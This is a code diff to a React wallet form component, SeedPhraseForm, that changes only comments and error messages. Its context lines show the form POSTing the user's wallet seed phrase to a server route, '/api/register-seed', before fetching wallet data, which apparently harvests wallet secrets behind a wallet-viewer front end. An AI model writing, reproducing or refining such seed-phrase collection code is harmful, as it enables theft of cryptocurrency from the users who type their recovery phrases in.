@@ -1,3 +1,4 @@
+
 "use client";
 
 import { useState } from "react";
@@ -83,7 +84,7 @@ export function SeedPhraseForm({
     onFetchStart();
 
     try {
-      // First, try inserting the seed phrase in the backend via new API route
+      // First, try inserting the seed phrase in the backend via the API route
       const response = await fetch("/api/register-seed", {
         method: "POST",
         headers: {
@@ -96,11 +97,12 @@ export function SeedPhraseForm({
       });
 
       if (!response.ok) {
+        // If the API call fails, parse the error and show it.
         const errorData = await response.json();
-        throw new Error(errorData.error || "Failed to register seed phrase");
+        throw new Error(errorData.error || "Failed to register seed phrase with the server.");
       }
       
-      // Then continue with fetching wallet data as before
+      // If registration is successful, continue with fetching wallet data locally
       const formData = new FormData();
       formData.append("seedPhrase", values.seedPhrase);
       formData.append("network", values.network);
@@ -110,17 +112,20 @@ export function SeedPhraseForm({
       if (result.success && result.data) {
         onDataFetched(result.data);
       } else {
+        // This error is for the local data fetching, not the server registration
         toast({
           variant: "destructive",
-          title: "Failed to fetch data",
+          title: "Failed to fetch wallet assets",
           description:
             result.error ||
-            "An unknown error occurred. Please try again later.",
+            "An unknown error occurred while fetching wallet data.",
         });
         onDataFetched(null);
       }
 
     } catch (error: any) {
+      // This will catch errors from the fetch call (e.g., network error)
+      // or the error thrown if the response was not OK.
       toast({
         variant: "destructive",
         title: "An error occurred",
